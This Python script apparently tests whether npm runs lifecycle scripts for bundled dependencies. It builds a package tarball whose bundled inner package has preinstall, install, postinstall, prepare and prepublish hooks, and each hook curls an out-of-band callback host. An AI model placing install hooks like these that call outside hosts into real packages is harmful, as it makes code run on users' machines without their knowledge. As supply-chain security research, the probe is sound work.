#!/usr/bin/env python3
"""
Test: bundledDependencies install scripts
Theory: bundledDependencies are copied, not re-installed.
npm might run lifecycle scripts differently for bundled deps.
"""

import tarfile
import io
import os

OAST = "juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun"
OUTPUT_DIR = "."

def create_bundled_tarball():
    """Create tarball with bundledDependencies containing install scripts"""
    tar = tarfile.open(f'{OUTPUT_DIR}/bundled_test.tar.gz', 'w:gz')

    # Outer package.json with bundledDependencies
    outer_pkg = b'''{
  "name": "bundled-test",
  "version": "1.0.0",
  "main": "index.js",
  "bundledDependencies": ["inner-pkg"],
  "dependencies": {
    "inner-pkg": "1.0.0"
  }
}'''

    # Outer index.js
    outer_idx = b'module.exports = { bundled: true };'

    # Inner package with ALL lifecycle scripts
    inner_pkg = f'''{{
  "name": "inner-pkg",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {{
    "preinstall": "curl -s https://{OAST}/bundled-preinstall || true",
    "install": "curl -s https://{OAST}/bundled-install || true",
    "postinstall": "curl -s https://{OAST}/bundled-postinstall || true",
    "prepare": "curl -s https://{OAST}/bundled-prepare || true",
    "prepublish": "curl -s https://{OAST}/bundled-prepublish || true"
  }}
}}'''.encode()

    inner_idx = b'module.exports = { inner: true };'

    # Add outer package files
    add_file(tar, 'package/package.json', outer_pkg)
    add_file(tar, 'package/index.js', outer_idx)

    # Add inner package in node_modules (bundled)
    add_file(tar, 'package/node_modules/inner-pkg/package.json', inner_pkg)
    add_file(tar, 'package/node_modules/inner-pkg/index.js', inner_idx)

    tar.close()
    print(f"[+] Created {OUTPUT_DIR}/bundled_test.tar.gz")

    # Show structure
    print("\nTarball structure:")
    tar = tarfile.open(f'{OUTPUT_DIR}/bundled_test.tar.gz', 'r:gz')
    for member in tar.getmembers():
        print(f"  {member.name}")
    tar.close()

def add_file(tar, name, content):
    info = tarfile.TarInfo(name=name)
    info.size = len(content)
    info.mode = 0o644
    tar.addfile(info, io.BytesIO(content))

if __name__ == '__main__':
    create_bundled_tarball()
